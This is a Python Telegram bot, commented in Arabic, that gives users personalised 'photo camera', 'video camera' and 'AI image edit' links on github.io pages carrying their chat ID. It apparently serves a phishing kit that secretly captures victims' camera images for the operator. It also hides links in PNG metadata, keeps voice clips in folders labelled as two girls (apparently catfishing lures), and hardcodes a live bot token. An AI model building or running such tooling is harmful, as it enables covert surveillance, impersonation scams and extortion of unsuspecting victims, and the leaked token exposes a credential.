import os
import json
import urllib3
import telebot
from telebot import types
from PIL import Image, PngImagePlugin
import threading
import http.server
import time

# إيقاف تحذيرات الشهادات لضمان استقرار الاتصال السحابي
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 🔑 إعداد توكن البوت الخاص بك (تم التحديث للتوكن الجديد)
BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
bot = telebot.TeleBot(BOT_TOKEN)

# مسار قاعدة بيانات الأصوات الآمن على Railway
DB_FILE = "/tmp/voice_db.json" if os.path.exists("/tmp") else "voice_db.json"

# الروابط الخاصة بالخدمات (تم تحديث رابط تعديل الصور بناءً على طلبك)
PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

user_states = {}
user_data = {}

# --- سيرفر وهمي لإبقاء Railway مستقراً ومنع الـ Crash ---
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server_address = ('', port)
    try:
        httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
        print(f"📡 السيرفر الوهمي يعمل بنجاح على المنفذ: {port}")
        httpd.serve_forever()
    except Exception as e:
        print(f"⚠️ تنبيه السيرفر الوهمي: {e}")

# --- إدارة قاعدة البيانات لحفظ مقاطع الصوت ---
def load_db():
    if not os.path.exists(DB_FILE) or os.path.getsize(DB_FILE) == 0:
        return {"girl_1": {}, "girl_2": {}}
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try:
            data = json.load(f)
            if "girl_1" not in data:
                data = {"girl_1": data, "girl_2": {}}
            return data
        except:
            return {"girl_1": {}, "girl_2": {}}

def save_db(db):
    try:
        dir_name = os.path.dirname(DB_FILE)
        if dir_name and not os.path.exists(dir_name):
            os.makedirs(dir_name, exist_ok=True)
        with open(DB_FILE, 'w', encoding='utf-8') as f: 
            json.dump(db, f, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"تحذير حفظ قاعدة البيانات: {e}")

# --- دالة حقن الرابط في ميتاداتا الصورة ---
def hide_link_in_metadata(image_path, link, output_path):
    try:
        img = Image.open(image_path).convert("RGB")
        meta = PngImagePlugin.PngInfo()
        meta.add_text("URL_LINK", link)
        img.save(output_path, "PNG", pnginfo=meta)
    except Exception as e:
        print(f"خطأ ميتاداتا: {e}")

# --- لوحة التحكم الأساسية المحدثة ---
def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("✨ طلب رابط تعديل الصور", callback_data="get_image_edit_link"),
        types.InlineKeyboardButton("🔒 حقن رابط in صورة", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    return markup

# --- استقبال أمر البدء /start ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = "🤖 **المطور سيف الدين يرحب بك في البوت الشامل!**\n\nالرجاء اختيار الخدمة المطلوبة من القائمة العمودية بالأسفل 👇"
    
    remove_keyboard = types.ReplyKeyboardRemove(selective=False)
    cleanup_msg = bot.send_message(message.chat.id, "🔄 جاري تهيئة وتنظيف القوائم...", reply_markup=remove_keyboard)
    bot.delete_message(message.chat.id, cleanup_msg.message_id)
    
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=get_main_keyboard())

# --- معالجة الضغط على الأزرار (Callback Query) ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    db = load_db()

    if call.data == "inject_start":
        user_states[chat_id] = "waiting_for_image_inject"
        bot.send_message(chat_id, "📸 **أرسل الصورة الآن لحقن الرابط داخل بياناتها:**", parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        
    elif call.data == "get_photo_link":
        link = f"{PHOTO_PAGE_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"🖼️ **رابط كاميرا الصور الخاص بك جاهز للفتح المباشر:**\n\n{link}", disable_web_page_preview=True)
        bot.answer_callback_query(call.id)
        
    elif call.data == "get_video_link":
        link = f"{VIDEO_PAGE_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"🎥 **رابط كاميرا الفيديو الخاص بك جاهز للفتح المباشر:**\n\n{link}", disable_web_page_preview=True)
        bot.answer_callback_query(call.id)

    elif call.data == "get_image_edit_link":
        # توليد وإرسال الرابط الجديد المحدث ديناميكياً بناءً على chatId للمستخدم الحالي
        link = f"{IMAGE_EDIT_URL}?chatId={chat_id}"
        bot.send_message(chat_id, f"✨ **رابط صفحة تعديل الصور بالذكاء الاصطناعي جاهز:**\n\n{link}", disable_web_page_preview=True)
        bot.answer_callback_query(call.id)
        
    elif call.data == "voice_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("👩 الفتاة 1", callback_data="girl_1_menu"),
            types.InlineKeyboardButton("👩 الفتاة 2", callback_data="girl_2_menu"),
            types.InlineKeyboardButton("🔙 عودة للقائمة الرئيسية", callback_data="main_menu")
        )
        bot.edit_message_text("اختر المجلد المطلوب للتعديل أو الاستماع:", chat_id=chat_id, message_id=msg_id, reply_markup=markup)
        bot.answer_callback_query(call.id)
        
    elif call.data == "girl_1_menu":
        user_states[chat_id] = "active_girl_1"
        markup = types.InlineKeyboardMarkup(row_width=2)
        girl_db = db.get("girl_1", {})
        for i in range(1, 11):
            name = f"مقطع {i}"
            status_emoji = "🎵" if name in girl_db else "⚪"
            markup.add(types.InlineKeyboardButton(f"{status_emoji} {name}", callback_data=f"play_g1:{name}"))
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("📂 مجلد الفتاة 1 (10 مقاطع) - أرسل أي فويس لتحديث الخانة المتاحة:", chat_id=chat_id, message_id=msg_id, reply_markup=markup)
        bot.answer_callback_query(call.id)

    elif call.data == "girl_2_menu":
        user_states[chat_id] = "active_girl_2"
        markup = types.InlineKeyboardMarkup(row_width=2)
        girl_db = db.get("girl_2", {})
        for i in range(1, 14):
            name = f"مقطع {i}"
            status_emoji = "🎵" if name in girl_db else "⚪"
            markup.add(types.InlineKeyboardButton(f"{status_emoji} {name}", callback_data=f"play_g2:{name}"))
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="voice_menu"))
        bot.edit_message_text("📂 مجلد الفتاة 2 (13 مقطعاً) - أرسل أي فويس لتحديث الخانة المتاحة:", chat_id=chat_id, message_id=msg_id, reply_markup=markup)
        bot.answer_callback_query(call.id)
        
    elif call.data == "main_menu":
        user_states[chat_id] = None
        welcome_text = "🤖 **المطور سيف الدين يرحب بك في البوت الشامل!**\n\nالرجاء اختيار الخدمة المطلوبة من القائمة العمودية بالأسفل 👇"
        bot.edit_message_text(welcome_text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=get_main_keyboard())
        bot.answer_callback_query(call.id)
        
    elif call.data.startswith("play_g1:"):
        name = call.data.split(":")[1]
        file_id = db.get("girl_1", {}).get(name)
        if file_id:
            try: 
                bot.send_voice(chat_id, file_id)
                bot.answer_callback_query(call.id)
            except: 
                bot.answer_callback_query(call.id, "❌ خطأ في استدعاء الصوت.")
        else: 
            bot.answer_callback_query(call.id, f"⚠️ {name} في مجلد الفتاة 1 فارغ! أرسل ملف فويس لحفظه هنا.", show_alert=True)

    elif call.data.startswith("play_g2:"):
        name = call.data.split(":")[1]
        file_id = db.get("girl_2", {}).get(name)
        if file_id:
            try: 
                bot.send_voice(chat_id, file_id)
                bot.answer_callback_query(call.id)
            except: 
                bot.answer_callback_query(call.id, "❌ خطأ في استدعاء الصوت.")
        else: 
            bot.answer_callback_query(call.id, f"⚠️ {name} في مجلد الفتاة 2 فارغ! أرسل ملف فويس لحفظه هنا.", show_alert=True)

# --- معالجة الرسائل والوسائط الواردة (فويس، صور، نصوص) ---
@bot.message_handler(content_types=['photo', 'text', 'voice'])
def handle_all_media(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)

    if message.voice:
        db = load_db()
        if state == "active_girl_2":
            target = "girl_2"
            max_slots = 13
            folder_name = "مجلد الفتاة 2"
        else:
            target = "girl_1"
            max_slots = 10
            folder_name = "مجلد الفتاة 1"

        next_slot = len(db[target]) + 1
        if next_slot > max_slots: 
            db[target] = {} 
            next_slot = 1
        name = f"مقطع {next_slot}"
        db[target][name] = message.voice.file_id
        save_db(db)
        bot.send_message(chat_id, f"✅ **تم حفظ وتحديث ({name}) بنجاح داخل {folder_name}!**", parse_mode="Markdown")
        
    elif state == "waiting_for_image_inject" and message.photo:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        img_path = os.path.join("/tmp" if os.path.exists("/tmp") else ".", f"img_{chat_id}.png")
        with open(img_path, 'wb') as f: 
            f.write(downloaded)
        user_data[chat_id] = img_path
        user_states[chat_id] = "waiting_for_link"
        bot.send_message(chat_id, "📥 **تم حفظ الصورة بنجاح! أرسل الآن الرابط المراد حقنه داخل ميتاداتا الصورة:**", parse_mode="Markdown")
        
    elif state == "waiting_for_link" and message.text:
        img_path = user_data.get(chat_id)
        out_path = os.path.join("/tmp" if os.path.exists("/tmp") else ".", f"out_{chat_id}.png")
        hide_link_in_metadata(img_path, message.text, out_path)
        if os.path.exists(out_path):
            with open(out_path, 'rb') as f: 
                bot.send_photo(chat_id, f, caption=f"✅ تم حقن الميتاداتا بنجاح!\n\n🔗 الرابط المحقن: {message.text}")
        user_states[chat_id] = None
        if os.path.exists(img_path): os.remove(img_path)
        if os.path.exists(out_path): os.remove(out_path)

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    
    try:
        bot.delete_webhook(drop_pending_updates=True)
        time.sleep(1)
    except Exception as e:
        print(f"تنبيه تهيئة: {e}")

    print("🚀 البوت يعمل وجاهز، تم تحديث الرابط الجديد لخانة تعديل الصور بنجاح...")
    bot.polling(none_stop=True, interval=0, timeout=50)
